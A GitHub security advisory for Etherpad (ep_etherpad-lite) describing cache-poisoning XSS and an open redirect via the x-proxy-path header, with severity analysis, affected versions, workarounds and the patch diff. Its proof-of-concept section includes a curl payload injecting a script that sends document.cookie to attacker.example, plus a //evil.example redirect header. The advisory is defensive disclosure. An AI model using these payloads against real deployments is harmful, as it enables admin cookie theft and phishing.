# [M] ep_etherpad-lite: Cache-poisoning Cross-site Scripting and Open Redirect via x-proxy-path Header

## Summary
Severity: Medium
Advisory: GHSA-fjgc-3mj7-8rg8
CVE: CVE-2026-55087
CWE: CWE-444, CWE-601, CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-08-13
Source: https://github.com/advisories/GHSA-fjgc-3mj7-8rg8
Type: github-advisory

## Affected
- npm: `ep_etherpad-lite` — affected >=2.1.0 <3.1.0

## Details
# GHSA-03 — `x-proxy-path` header reflected into admin HTML/JS/CSS (cache-poisoning XSS) and concatenated into redirect (open-redirect)

**Severity:** Medium
**CVSS v3.1 vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**CVSS suggested base score:** ~6.1 — Medium
  *(Re-validate in the first.gov calculator before filing. Score depends heavily on whether you assume a cooperative cache exists in front of the deployment — single-origin admin-only ops with no shared cache push toward 4.x; cache-poisoning against a CDN pushes toward 7.x.)*
**CWE:** CWE-79 Improper Neutralization of Input During Web Page Generation, CWE-601 URL Redirection to Untrusted Site, CWE-444 Inconsistent Interpretation of HTTP Requests

## Title

`x-proxy-path` request header is interpolated into admin HTML/JS/CSS without sanitisation (cache-poisoning XSS) and into a `/p/:pad/timeslider` redirect target (open-redirect via protocol-relative URL)

## Description

Etherpad lets operators run behind a reverse proxy that prefixes every route with a subpath (e.g. `/pad/etherpad/...`). The proxy is expected to set `x-proxy-path: /pad/etherpad` on every request so that server-rendered links, asset URLs, and redirects know to include the prefix. Two server-side call sites historically processed this header:

### Issue 3a — `src/node/hooks/express/admin.ts` (XSS, cache-poisoning)

The admin static-serving handler read `req.header('x-proxy-path')` and substituted it into the response body of every `.html`/`.js`/`.css` asset under `/admin/*` using `String.prototype.replaceAll`. The value was used **raw**, with no character filter and no `Vary` / `Cache-Control` headers on the response. Consequently:

- An attacker who can issue a request with a chosen `x-proxy-path` value gets that value reflected into HTML/JS/CSS sent back to them. **Reflected XSS** on the admin origin (requires victim to be tricked into issuing the request from a context that interprets HTML).
- More seriously, any reverse proxy or CDN in front of Etherpad that caches `/admin/index.html` keyed on URL alone (the common case — no `Vary` was set) will cache the poisoned response and serve it to subsequent admins. **Cache-poisoning XSS** against every admin that loads the same bundle from the same cache.

### Issue 3b — `src/node/hooks/express/specialpages.ts` (open-redirect via protocol-relative URL)

The legacy `/p/:pad/timeslider` handler (direct visits without `?embed=1`) built a redirect target as:

```ts
res.redirect(302, `${proxyPath}/p/${encodeURIComponent(req.params.pad)}`);
```

A local `sanitizeProxyPath` helper filtered the character class but did NOT prevent values beginning with `//`. A request carrying `x-proxy-path: //evil.example` therefore produced a `Location: //evil.example/p/<pad>` header, which browsers interpret as a protocol-relative URL — equivalent to `https://evil.example/p/<pad>`. **Open redirect**, exploitable for phishing.

Both issues require the `x-proxy-path` header to actually reach Etherpad. In a hardened reverse-proxy deployment the proxy strips/overrides client headers, but Etherpad does not enforce this and self-hosted users with misconfigured proxies (or no proxy at all, where any client sets arbitrary headers) are exposed.

## Severity rationale

- **AV:N / AC:L / PR:N** — the admin path requires no authentication of the attacker. The victim of the XSS must be an authenticated admin who loads a poisoned cached response.
- **UI:R** — victim must visit/interact with the admin UI.
- **S:C** — scope changes (attacker context to admin origin).
- **C:L / I:L** — XSS in the admin context can read/write admin-scoped data; full admin-account takeover requires additional CSRF-style chaining.

CVSS lands at 6.1 (Medium). Operators behind a well-configured proxy that strips client `x-proxy-path` are not exposed.

## Affected versions

- **Admin XSS (Issue 3a):** `ep_etherpad-lite >= 2.1.0, <= 3.0.0`. The unsanitised `replaceAll("/admin", req.header(PROXY_HEADER) + ...)` was present in [`63e9b2d` "Fixed api header authorization" (#6399)](https://github.com/ether/etherpad/commit/63e9b2d), first tagged in **v2.1.0** (2024-05-22). All releases through `v3.0.0` carry it.
- **Open-redirect (Issue 3b):** `ep_etherpad-lite = 3.0.0`. The legacy timeslider redirect that concatenates the proxy path into a `Location` header was introduced in [`451bd9c` "scrub history in-place on the pad URL" (#7710)](https://github.com/ether/etherpad/commit/451bd9c) and first shipped in **v3.0.0**. Pre-v3 releases serve the timeslider directly without a redirect and are not exposed to this specific shape.
- Combined fix-target range covered by the GHSA: `>= 2.1.0, <= 3.0.0`.

## Patched versions

- `ep_etherpad-lite >= 3.1.0` — the fix is on `develop` HEAD as commit `8c6104c`. Update this field with the actual tagged release version when it ships.

## Proof of concept

### XSS / cache poisoning

```
curl -s 'https://pad.example/admin/index.html' \
  -H 'x-proxy-path: "><script>fetch("https://attacker.example/?c="+document.cookie)</script><i a="'

# If served by a shared cache without Vary on x-proxy-path, subsequent
# requests to /admin/index.html (from any admin) get the same poisoned
# HTML.
```

### Open redirect

```
curl -i 'https://pad.example/p/foo/timeslider' \
  -H 'x-proxy-path: //evil.example'

# HTTP/1.1 302 Found
# Location: //evil.example/p/foo
```

A browser followed against the etherpad origin treats `//evil.example/p/foo` as `https://evil.example/p/foo`.

## Workarounds

- Configure the reverse proxy (nginx, traefik, HAProxy, etc.) to strip or overwrite `x-proxy-path` from inbound client requests. Most production deployments already do this; the bug only matters in deployments that don't.
- For the timeslider redirect specifically: disable the legacy direct-timeslider URL by client-side routing to `/p/:pad` (the in-pad PadModeController handles history mode without ever loading the standalone timeslider).

## Fix

Patched in [`8c6104c`](https://github.com/ether/etherpad/commit/8c6104c) (PR [#7784](https://github.com/ether/etherpad/pull/7784)):

1. Extracted `src/node/utils/sanitizeProxyPath.ts` — a single shared helper used by both admin.ts and specialpages.ts. The helper:
   - returns `""` when the header is absent;
   - strips characters outside `[A-Za-z0-9_./-]`;
   - collapses a leading `//+` to a single `/` (kills protocol-relative URLs);
   - prepends `/` if the cleaned non-empty value doesn't already have one (so callers can always concatenate as an absolute prefix);
   - rejects `..` traversal segments.
2. admin.ts now emits `Vary: x-proxy-path` and `Cache-Control: private, no-store` on HTML/JS/CSS responses that varied by the header, so downstream caches cannot collapse responses across different header values.

`src/node/hooks/express/specialpages.ts` — replace the local sanitiser with the shared one:

```diff
-const sanitizeProxyPath = (req: any): string => {
-  const raw = req.header('x-proxy-path') || '';
-  return raw.replace(/[^a-zA-Z0-9\-_\/\.]/g, '');
-};
+import {sanitizeProxyPath} from '../../utils/sanitizeProxyPath';
```

`src/node/hooks/express/admin.ts` — sanitise the value AND emit cache-key/cache-control headers so a shared cache can't collapse responses across different proxy-path values:

```diff
   if (ext === ".html" || ext === ".js" || ext === ".css") {
-    if (req.header(PROXY_HEADER)) {
+    const proxyPath = sanitizeProxyPath(req);
+    if (proxyPath) {
       let string = data.toString()
-      dataToSend = string.replaceAll("/admin", req.header(PROXY_HEADER) + "/admin")
-      dataToSend = dataToSend.replaceAll("/socket.io", req.header(PROXY_HEADER) + "/socket.io")
+      dataToSend = string.replaceAll("/admin", proxyPath + "/admin")
+      dataToSend = dataToSend.replaceAll("/socket.io", proxyPath + "/socket.io")
     }
+    res.setHeader('Vary', 'x-proxy-path');
+    res.setHeader('Cache-Control', 'private, no-store');
   }
```

## Resources

- Patched in: https://github.com/ether/etherpad/pull/7784 (squash commit `8c6104c`).
- Admin XSS vulnerable code introduced in: https://github.com/ether/etherpad/commit/63e9b2d (PR #6399), released in v2.1.0.
- Open-redirect vulnerable code introduced in: https://github.com/ether/etherpad/commit/451bd9c (PR #7710), released in v3.0.0.

## Credits

Reported during an internal security audit by Claude (via @JohnMcLear).

## References
- https://github.com/ether/etherpad/security/advisories/GHSA-fjgc-3mj7-8rg8
- https://github.com/ether/etherpad/pull/6399
- https://github.com/ether/etherpad/pull/7710
- https://github.com/ether/etherpad/pull/7784
- https://github.com/ether/etherpad/commit/451bd9c3ebb0dded99dd0ff21811ee00e0940c29
- https://github.com/ether/etherpad/commit/63e9b2d4eb303cd341022591bdf9484584db36e3
- https://github.com/ether/etherpad
